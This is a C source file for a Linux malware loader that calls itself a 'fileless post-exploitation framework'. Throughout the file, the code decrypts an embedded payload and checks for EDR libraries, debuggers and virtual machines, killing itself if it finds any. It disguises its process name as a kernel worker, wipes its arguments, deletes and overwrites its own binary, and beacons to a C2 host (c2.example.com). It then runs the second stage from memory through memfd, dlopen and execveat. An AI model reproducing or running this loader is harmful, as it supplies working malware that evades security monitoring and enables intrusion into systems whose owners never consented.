#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <errno.h>
#include <time.h>
#include <stdint.h>
#include <linux/memfd.h>
#include <sys/ptrace.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <curl/curl.h>
#include <dlfcn.h>
#include "junk.h"  // Generated per build for JUNK_ASM
#include "anti_analysis.h"  // Enhanced anti-analysis functions
#include "qf_logging.h"  // JSON logging system
#include "qf_crypto.h"  // Modular cryptography library

#ifndef AT_EMPTY_PATH
#define AT_EMPTY_PATH 0x1000
#endif

#ifndef SYS_execveat
#define SYS_execveat 322
#endif

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

extern char **environ;

// Encrypted payload and IV (replaced at build time)
unsigned char encrypted_payload[] = "__ENCRYPTED_PAYLOAD__";
unsigned char iv[] = "__IV__";
const unsigned char base_key[] = "__BASE_KEY__";
size_t payload_len = sizeof(encrypted_payload);

typedef struct {
    int no_doh;
    int no_selfdelete;
    int fallback_only;
    int test_mode;
    int show_help;
    char *stage_file;
    char *doh_provider;
} config_t;

config_t config = {0, 0, 0, 0, 0, NULL, "https://dns.google/dns-query"};

// XOR key for in-memory encryption
unsigned char xor_key = 0xAA;

// Get RDTSC timestamp
unsigned long get_rdtsc() {
    unsigned int lo, hi;
    asm volatile ("rdtsc" : "=a"(lo), "=d"(hi));
    return ((unsigned long)hi << 32) | lo;
}

// Simple HKDF implementation using HMAC
static volatile sig_atomic_t shutdown_requested = 0;

static void signal_handler(int sig) {
    shutdown_requested = 1;
    qf_logger_close(128 + sig);
    _exit(128 + sig);
}

static void setup_signal_handlers(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = signal_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);
}

int decrypt_payload(unsigned char *decrypted_payload) {
    unsigned char salt[16];
    unsigned long tsc = get_rdtsc();
    for (int i = 0; i < 16; i++) {
        salt[i] = (tsc >> (i * 8)) & 0xFF;
    }

    unsigned char derived_key[32];
    if (!qf_hkdf(derived_key, 32, salt, 16, base_key, sizeof(base_key) - 1, NULL, 0)) {
        QF_LOG_ERROR("crypto", "HKDF key derivation failed", "entropy_check_failed");
        secure_zero_memory(derived_key, sizeof(derived_key));
        return -1;
    }

    JUNK_ASM;

    int plaintext_len;
    if (!qf_aes_decrypt(decrypted_payload, &plaintext_len, encrypted_payload, payload_len, derived_key, iv)) {
        QF_LOG_ERROR("crypto", "AES decryption failed", "invalid_ciphertext");
        secure_zero_memory(derived_key, sizeof(derived_key));
        return -1;
    }
    
    payload_len = plaintext_len;
    secure_zero_memory(derived_key, sizeof(derived_key));
    return 0;
}

// XOR encrypt/decrypt in memory
void xor_memory(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// EDR hook detection via LD_AUDIT and LD_PRELOAD
int check_edr_hooks() {
    char *ld_preload = getenv("LD_PRELOAD");
    char *ld_audit = getenv("LD_AUDIT");
    
    if (ld_preload != NULL && strlen(ld_preload) > 0) {
        if (config.test_mode) {
            fprintf(stderr, "[!] EDR detected: LD_PRELOAD=%s\n", ld_preload);
        }
        return 1;
    }
    
    if (ld_audit != NULL && strlen(ld_audit) > 0) {
        if (config.test_mode) {
            fprintf(stderr, "[!] EDR detected: LD_AUDIT=%s\n", ld_audit);
        }
        return 1;
    }
    
    int fd = syscall(SYS_open, "/proc/self/maps", O_RDONLY);
    if (fd >= 0) {
        char buf[8192];
        ssize_t n = syscall(SYS_read, fd, buf, sizeof(buf) - 1);
        syscall(SYS_close, fd);
        if (n > 0) {
            buf[n] = '\0';
            if (strstr(buf, "libcrowdstrike") || 
                strstr(buf, "libsysdig") ||
                strstr(buf, "libedr") ||
                strstr(buf, "falco") ||
                strstr(buf, "sentinel") ||
                strstr(buf, "cylance")) {
                if (config.test_mode) {
                    fprintf(stderr, "[!] EDR library detected in memory maps\n");
                }
                return 1;
            }
        }
    }
    
    return 0;
}

// Anti-debugging via TracerPid
int is_debugged() {
    char buf[256];
    int fd = syscall(SYS_open, "/proc/self/status", O_RDONLY);
    if (fd < 0) return 0;
    ssize_t n = syscall(SYS_read, fd, buf, sizeof(buf) - 1);
    syscall(SYS_close, fd);
    if (n <= 0) return 0;
    buf[n] = '\0';
    char *tracer = strstr(buf, "TracerPid:");
    if (tracer) {
        return atoi(tracer + 10) != 0;
    }
    return 0;
}

typedef struct {
    char *data;
    size_t size;
} memory_chunk_t;

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    memory_chunk_t *mem = (memory_chunk_t *)userp;
    
    char *ptr = realloc(mem->data, mem->size + realsize + 1);
    if (!ptr) return 0;
    
    mem->data = ptr;
    memcpy(&(mem->data[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->data[mem->size] = '\0';
    
    return realsize;
}

const char *get_random_user_agent() {
    const char *user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0"
    };
    
    unsigned long tsc = get_rdtsc();
    int index = tsc % (sizeof(user_agents) / sizeof(user_agents[0]));
    return user_agents[index];
}

int doh_c2_trigger() {
    if (config.no_doh) {
        if (config.test_mode) {
            fprintf(stderr, "[*] DoH trigger disabled (--no-doh)\n");
        }
        return -1;
    }
    
    CURL *curl = curl_easy_init();
    if (!curl) {
        if (config.test_mode) {
            fprintf(stderr, "[!] Failed to initialize curl\n");
        }
        return -1;
    }
    
    memory_chunk_t chunk = {NULL, 0};
    char url[512];
    struct curl_slist *headers = NULL;
    
    if (strstr(config.doh_provider, "cloudflare")) {
        snprintf(url, sizeof(url), "%s?name=c2.example.com&type=TXT", config.doh_provider);
        headers = curl_slist_append(headers, "accept: application/dns-json");
    } else {
        snprintf(url, sizeof(url), "%s?name=c2.example.com&type=16", config.doh_provider);
    }
    
    char user_agent_header[256];
    snprintf(user_agent_header, sizeof(user_agent_header), "User-Agent: %s", get_random_user_agent());
    headers = curl_slist_append(headers, user_agent_header);
    
    if (config.test_mode) {
        fprintf(stderr, "[*] DoH Query: %s\n", url);
        fprintf(stderr, "[*] Provider: %s\n", config.doh_provider);
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &chunk);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_LOW_SPEED_LIMIT, 100L);
    curl_easy_setopt(curl, CURLOPT_LOW_SPEED_TIME, 3L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
    curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 0L);
    
    CURLcode res = curl_easy_perform(curl);
    int result = -1;
    
    if (res == CURLE_OK && chunk.data) {
        if (config.test_mode) {
            fprintf(stderr, "[*] DoH Response: %s\n", chunk.data);
        }
        
        if (strstr(chunk.data, "\"Status\":0") || strstr(chunk.data, "\"Status\": 0")) {
            if (strstr(chunk.data, "C2_TRIGGER:1")) {
                result = 0;
                if (config.test_mode) {
                    fprintf(stderr, "[+] C2 trigger found in TXT record\n");
                }
            } else {
                if (config.test_mode) {
                    fprintf(stderr, "[*] No C2 trigger in response\n");
                }
            }
        } else {
            if (config.test_mode) {
                fprintf(stderr, "[!] DNS query failed or returned error status\n");
            }
        }
    } else {
        if (config.test_mode) {
            fprintf(stderr, "[!] DoH request failed: %s\n", curl_easy_strerror(res));
        }
    }
    
    if (chunk.data) {
        free(chunk.data);
    }
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    
    return result;
}

int retrieve_beacon_payload(unsigned char **payload_out, size_t *size_out) {
    if (config.no_doh) {
        if (config.test_mode) {
            fprintf(stderr, "[*] Beacon retrieval skipped (--no-doh)\n");
        }
        return -1;
    }
    
    CURL *curl = curl_easy_init();
    if (!curl) {
        if (config.test_mode) {
            fprintf(stderr, "[!] Failed to initialize curl for beacon\n");
        }
        return -1;
    }
    
    memory_chunk_t chunk = {NULL, 0};
    struct curl_slist *headers = NULL;
    
    char user_agent_header[256];
    snprintf(user_agent_header, sizeof(user_agent_header), "User-Agent: %s", get_random_user_agent());
    headers = curl_slist_append(headers, user_agent_header);
    headers = curl_slist_append(headers, "X-Client-ID: QF-2024");
    headers = curl_slist_append(headers, "Accept: application/octet-stream");
    
    if (config.test_mode) {
        fprintf(stderr, "[*] Retrieving payload from: https://c2.example.com/beacon\n");
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, "https://c2.example.com/beacon");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &chunk);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 3L);
    
    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    
    int result = -1;
    
    if (res == CURLE_OK && http_code == 200 && chunk.data && chunk.size > 0) {
        *payload_out = (unsigned char *)chunk.data;
        *size_out = chunk.size;
        result = 0;
        
        if (config.test_mode) {
            fprintf(stderr, "[+] Beacon payload retrieved: %zu bytes\n", chunk.size);
        }
    } else {
        if (config.test_mode) {
            fprintf(stderr, "[!] Beacon retrieval failed: HTTP %ld, curl: %s\n", 
                    http_code, curl_easy_strerror(res));
        }
        if (chunk.data) {
            free(chunk.data);
        }
    }
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    
    return result;
}

void send_beacon(unsigned char *shellcode, size_t shellcode_len) {
    if (config.no_doh) return;
    
    CURL *curl = curl_easy_init();
    if (!curl) return;

    char *base64_shellcode = malloc(((shellcode_len + 2) / 3) * 4 + 1);
    if (!base64_shellcode) return;
    int encoded_len = EVP_EncodeBlock((unsigned char *)base64_shellcode, shellcode, shellcode_len);
    base64_shellcode[encoded_len] = '\0';

    struct curl_slist *headers = NULL;
    char user_agent_header[256];
    snprintf(user_agent_header, sizeof(user_agent_header), "User-Agent: %s", get_random_user_agent());
    headers = curl_slist_append(headers, user_agent_header);
    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
    headers = curl_slist_append(headers, "X-Client-ID: QF-2024");

    if (config.test_mode) {
        fprintf(stderr, "[*] Sending beacon to C2 (%d bytes base64)\n", encoded_len);
    }

    curl_easy_setopt(curl, CURLOPT_URL, "https://c2.example.com/beacon");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, base64_shellcode);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    CURLcode res = curl_easy_perform(curl);
    
    if (config.test_mode) {
        if (res == CURLE_OK) {
            fprintf(stderr, "[+] Beacon sent successfully\n");
        } else {
            fprintf(stderr, "[!] Beacon send failed: %s\n", curl_easy_strerror(res));
        }
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(base64_shellcode);
}

// Comprehensive memory scrubbing
void scrub_memory_region(void *addr, size_t len) {
    if (!addr || len == 0) return;
    
    size_t page_size = sysconf(_SC_PAGESIZE);
    void *aligned_addr = (void *)((uintptr_t)addr & ~(page_size - 1));
    size_t aligned_len = (((uintptr_t)addr + len + page_size - 1) & ~(page_size - 1)) - (uintptr_t)aligned_addr;
    
    memset(addr, 0xCC, len);
    memset(addr, 0xAA, len);
    memset(addr, 0x00, len);
    
    mprotect(aligned_addr, aligned_len, PROT_NONE);
    
    if (config.test_mode) {
        fprintf(stderr, "[*] Scrubbed %zu bytes at %p\n", len, addr);
    }
}

// Enhanced SO loader via dlopen from memfd
int load_so_payload(unsigned char *decrypted_payload, size_t len) {
    int fd = syscall(SYS_memfd_create, "lib", MFD_CLOEXEC);
    if (fd < 0) {
        if (config.test_mode) {
            fprintf(stderr, "[!] memfd_create failed for SO: %d\n", errno);
        }
        return -1;
    }
    
    ssize_t written = syscall(SYS_write, fd, decrypted_payload, len);
    if (written != (ssize_t)len) {
        syscall(SYS_close, fd);
        return -1;
    }
    
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    
    void *handle = dlopen(path, RTLD_NOW | RTLD_LOCAL);
    if (!handle) {
        if (config.test_mode) {
            fprintf(stderr, "[!] dlopen failed: %s\n", dlerror());
        }
        syscall(SYS_close, fd);
        return -1;
    }
    
    if (config.test_mode) {
        fprintf(stderr, "[*] SO loaded successfully from memfd\n");
    }
    
    void (*entry)() = dlsym(handle, "entry");
    if (entry) {
        if (config.test_mode) {
            fprintf(stderr, "[*] Calling SO entry point\n");
        }
        entry();
    } else {
        void (*ctor)() = dlsym(handle, "so_constructor");
        if (ctor) {
            if (config.test_mode) {
                fprintf(stderr, "[*] Calling SO constructor\n");
            }
            ctor();
        } else if (config.test_mode) {
            fprintf(stderr, "[*] SO loaded (constructor already executed)\n");
        }
    }
    
    scrub_memory_region(decrypted_payload, len);
    
    dlclose(handle);
    syscall(SYS_close, fd);
    
    return 0;
}

// Second-stage loader (dlopen from memory) - legacy wrapper
void load_second_stage(unsigned char *decrypted_payload) {
    load_so_payload(decrypted_payload, payload_len);
}

// Wipe argv and environ
void nuke_args_env(int argc, char **argv) {
    for (int i = 0; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
    }
    for (char **e = environ; *e; e++) {
        memset(*e, 0, strlen(*e));
    }
    JUNK_ASM;
}

// Enhanced ELF loader with execveat
int load_elf_execveat(unsigned char *decrypted_payload, size_t len) {
    int fd = syscall(SYS_memfd_create, "elf", MFD_CLOEXEC);
    if (fd < 0) {
        if (config.test_mode) {
            fprintf(stderr, "[!] memfd_create failed for ELF: %d\n", errno);
        }
        return -1;
    }
    
    ssize_t written = syscall(SYS_write, fd, decrypted_payload, len);
    if (written != (ssize_t)len) {
        syscall(SYS_close, fd);
        return -1;
    }
    
    if (config.test_mode) {
        fprintf(stderr, "[*] ELF written to memfd, attempting execveat\n");
    }
    
    scrub_memory_region(decrypted_payload, len);
    
    char *empty_argv[] = { "", NULL };
    char *empty_envp[] = { NULL };
    
    int result = syscall(SYS_execveat, fd, "", empty_argv, empty_envp, AT_EMPTY_PATH);
    
    if (result < 0 && config.test_mode) {
        fprintf(stderr, "[!] execveat failed: %d\n", errno);
    }
    
    syscall(SYS_close, fd);
    return result;
}

// Memory-only execution via execve (fallback)
void exec_memfd(unsigned char *decrypted_payload) {
    int fd = syscall(SYS_memfd_create, "arc", MFD_CLOEXEC);
    if (fd < 0) return;
    syscall(SYS_write, fd, decrypted_payload, payload_len);
    
    scrub_memory_region(decrypted_payload, payload_len);
    
    char path[32] = "/proc/self/fd/";
    char fd_str[16];
    snprintf(fd_str, sizeof(fd_str), "%d", fd);
    strcat(path, fd_str);
    char *empty_argv[] = { NULL };
    char *empty_envp[] = { NULL };
    syscall(SYS_execve, path, empty_argv, empty_envp);
    syscall(SYS_close, fd);
}

// Scramble self with syscalls
void scramble_self() {
    int fd = syscall(SYS_open, "/proc/self/exe", O_WRONLY);
    if (fd < 0) return;
    char junk[4096];
    memset(junk, 0xCC, sizeof(junk));
    for (int i = 0; i < 100; i++) {
        syscall(SYS_lseek, fd, i * 4096, SEEK_SET);
        syscall(SYS_write, fd, junk, sizeof(junk));
    }
    syscall(SYS_close, fd);
}

// Anti-debugging
void anti_debug() {
    if (is_debugged() || syscall(SYS_ptrace, PTRACE_TRACEME, 0, 1, 0) < 0) {
        syscall(SYS_kill, getpid(), SIGKILL);
    }
}

// Enhanced self-delete with verification
void unlink_self() {
    if (config.no_selfdelete) {
        if (config.test_mode) {
            fprintf(stderr, "[*] Self-delete skipped (--no-selfdelete)\n");
        }
        return;
    }
    
    char path[256];
    ssize_t len = syscall(SYS_readlink, "/proc/self/exe", path, sizeof(path) - 1);
    if (len > 0) {
        path[len] = '\0';
        
        int result = syscall(SYS_unlink, path);
        
        if (config.test_mode) {
            if (result == 0) {
                fprintf(stderr, "[*] Self-deleted: %s\n", path);
            } else {
                fprintf(stderr, "[!] Self-delete failed: %s (errno: %d)\n", path, errno);
            }
        }
        
        int fd = syscall(SYS_open, path, O_RDONLY);
        if (fd >= 0) {
            syscall(SYS_close, fd);
            if (config.test_mode) {
                fprintf(stderr, "[!] Warning: Binary still accessible after unlink\n");
            }
        } else {
            if (config.test_mode) {
                fprintf(stderr, "[*] Verified: Binary no longer accessible\n");
            }
        }
    }
}

// Fake process name
void set_fake_name() {
    syscall(SYS_prctl, PR_SET_NAME, "[kworker/u64:2]", 0, 0, 0);
}

// Fallback HTTP server
void fallback_http(unsigned char *decrypted_payload) {
    if (!config.fallback_only) return;
    int sockfd = syscall(SYS_socket, AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = { AF_INET, htons(8080), { INADDR_ANY } };
    syscall(SYS_bind, sockfd, (struct sockaddr*)&addr, sizeof(addr));
    syscall(SYS_listen, sockfd, 5);
    printf("[*] Fallback HTTP server on :8080\n");
    while (1) {
        int client = syscall(SYS_accept, sockfd, NULL, NULL);
        syscall(SYS_write, client, decrypted_payload, payload_len);
        syscall(SYS_close, client);
    }
}

// Anti-VM check via CPUID
int is_vm() {
    char vendor[13];
    unsigned int eax, ebx, ecx, edx;
    __asm__ __volatile__ ("cpuid" : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx) : "a"(0));
    memcpy(vendor, &ebx, 4);
    memcpy(vendor + 4, &edx, 4);
    memcpy(vendor + 8, &ecx, 4);
    vendor[12] = '\0';
    if (!strcmp(vendor, "VMwareVMware") || !strcmp(vendor, "KVMKVMKVM")) {
        return 1;
    }
    return sysconf(_SC_NPROCESSORS_ONLN) < 2;
}

void print_help(const char *prog) {
    fprintf(stderr, "Usage: %s [OPTIONS]\n\n", prog);
    fprintf(stderr, "QuantumForge Loader - Fileless Post-Exploitation Framework\n\n");
    fprintf(stderr, "Options:\n");
    fprintf(stderr, "  --no-doh             Disable DNS-over-HTTPS C2 trigger\n");
    fprintf(stderr, "  --no-selfdelete      Prevent loader from unlinking itself\n");
    fprintf(stderr, "  --fallback-only      Serve stage locally via HTTP :8080 (offline mode)\n");
    fprintf(stderr, "  --test-mode          Enable debug output, simulate without execution\n");
    fprintf(stderr, "  --stage-file <path>  Supply local stage file for manual testing\n");
    fprintf(stderr, "  --doh-provider <url> Custom DoH resolver (default: dns.google)\n");
    fprintf(stderr, "  --help               Show this help message\n\n");
    fprintf(stderr, "Examples:\n");
    fprintf(stderr, "  %s --test-mode --no-doh\n", prog);
    fprintf(stderr, "  %s --fallback-only --stage-file payload.bin\n", prog);
    fprintf(stderr, "  %s --doh-provider https://cloudflare-dns.com/dns-query\n\n", prog);
}

int validate_config() {
    if (config.fallback_only && config.stage_file) {
        fprintf(stderr, "[!] Error: --fallback-only and --stage-file are mutually exclusive\n");
        return -1;
    }
    if (config.stage_file) {
        int fd = syscall(SYS_open, config.stage_file, O_RDONLY);
        if (fd < 0) {
            fprintf(stderr, "[!] Error: Cannot open stage file: %s\n", config.stage_file);
            return -1;
        }
        syscall(SYS_close, fd);
    }
    return 0;
}

void parse_flags(int argc, char **argv) {
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--no-doh") == 0) {
            config.no_doh = 1;
        } else if (strcmp(argv[i], "--no-selfdelete") == 0) {
            config.no_selfdelete = 1;
        } else if (strcmp(argv[i], "--fallback-only") == 0) {
            config.fallback_only = 1;
        } else if (strcmp(argv[i], "--test-mode") == 0) {
            config.test_mode = 1;
        } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            config.show_help = 1;
        } else if (strcmp(argv[i], "--stage-file") == 0) {
            if (i + 1 < argc) {
                config.stage_file = argv[++i];
            } else {
                fprintf(stderr, "[!] Error: --stage-file requires a path\n");
                exit(1);
            }
        } else if (strcmp(argv[i], "--doh-provider") == 0) {
            if (i + 1 < argc) {
                config.doh_provider = argv[++i];
            } else {
                fprintf(stderr, "[!] Error: --doh-provider requires a URL\n");
                exit(1);
            }
        } else {
            fprintf(stderr, "[!] Unknown option: %s\n", argv[i]);
            fprintf(stderr, "Use --help for usage information\n");
            exit(1);
        }
    }
}

int main(int argc, char **argv) {
    parse_flags(argc, argv);
    
    if (config.show_help) {
        print_help(argv[0]);
        return 0;
    }
    
    if (validate_config() != 0) {
        return 1;
    }
    
    setup_signal_handlers();
    qf_logger_init("linux");
    QF_LOG_INFO("main", "QuantumForge loader started", NULL);
    
    if (config.test_mode) {
        fprintf(stderr, "[*] Test mode enabled - simulation only\n");
        fprintf(stderr, "[*] Config: no_doh=%d, no_selfdelete=%d, fallback=%d\n", 
                config.no_doh, config.no_selfdelete, config.fallback_only);
        QF_LOG_INFO("config", "Test mode enabled", "simulation_only");
        qf_logger_set_level(LOG_LEVEL_DEBUG);
    }
    
    set_fake_name();
    nuke_args_env(argc, argv);
    
    if (!config.test_mode) {
        QF_LOG_INFO("anti_analysis", "Running anti-analysis checks", NULL);
        if (check_edr_hooks()) {
            QF_LOG_ERROR("edr", "EDR hooks detected, terminating", NULL);
            qf_logger_close(1);
            syscall(SYS_kill, getpid(), SIGKILL);
        }
        
        if (check_all_anti_analysis(0)) {
            QF_LOG_ERROR("anti_analysis", "Analysis environment detected, terminating", NULL);
            qf_logger_close(1);
            syscall(SYS_kill, getpid(), SIGKILL);
        }
        QF_LOG_SUCCESS("anti_analysis", "No threats detected", NULL);
    } else {
        fprintf(stderr, "[*] Skipping anti-analysis checks (test mode)\n");
        check_edr_hooks();
        QF_LOG_INFO("anti_analysis", "Skipped in test mode", NULL);
    }

    unsigned char *decrypted_payload = malloc(payload_len);
    if (!decrypted_payload) exit(1);

    if (config.test_mode) {
        memset(decrypted_payload, 0, payload_len);
        fprintf(stderr, "[*] Test mode: skipping decryption\n");
    } else {
        if (decrypt_payload(decrypted_payload) != 0) {
            QF_LOG_ERROR("main", "Payload decryption failed", NULL);
            secure_zero_memory(decrypted_payload, payload_len);
            free(decrypted_payload);
            qf_logger_close(1);
            return 1;
        }
        xor_memory(decrypted_payload, payload_len, xor_key);
        
        size_t page_size = sysconf(_SC_PAGESIZE);
        void *start = (void *)((uintptr_t)encrypted_payload & ~(page_size - 1));
        size_t len = (((uintptr_t)encrypted_payload + sizeof(encrypted_payload) + page_size - 1) & ~(page_size - 1)) - (uintptr_t)start;
        mprotect(start, len, PROT_NONE);
    }

    if (config.test_mode) {
        fprintf(stderr, "[*] Payload decrypted successfully (size: %zu bytes)\n", payload_len);
        fprintf(stderr, "[*] Test mode: skipping execution\n");
        char size_buf[64];
        snprintf(size_buf, sizeof(size_buf), "%zu bytes", payload_len);
        QF_LOG_SUCCESS("decrypt", "Payload decrypted successfully", size_buf);
        QF_LOG_INFO("test_mode", "Skipping execution in test mode", NULL);
        const char *log_path = qf_logger_get_path();
        if (log_path) {
            fprintf(stderr, "[*] Log file: %s\n", log_path);
        }
        qf_logger_close(0);
        free(decrypted_payload);
        return 0;
    }

    QF_LOG_SUCCESS("decrypt", "Payload decrypted", NULL);

    if (doh_c2_trigger() == 0) {
        printf("[*] C2 trigger successful\n");
        QF_LOG_SUCCESS("c2", "DoH C2 trigger successful", NULL);
    }

    send_beacon(decrypted_payload, payload_len);
    QF_LOG_INFO("beacon", "Beacon sent", NULL);

    xor_memory(decrypted_payload, payload_len, xor_key);

    unlink_self();
    QF_LOG_INFO("stealth", "Self-delete executed", NULL);
    scramble_self();

    if (!config.fallback_only) {
        QF_LOG_INFO("execution", "Loading second stage", "memory_resident");
        load_second_stage(decrypted_payload);
        exec_memfd(decrypted_payload);
    } else {
        QF_LOG_INFO("execution", "Using fallback HTTP mode", NULL);
        fallback_http(decrypted_payload);
    }

    qf_logger_close(0);
    free(decrypted_payload);
    return 0;
}
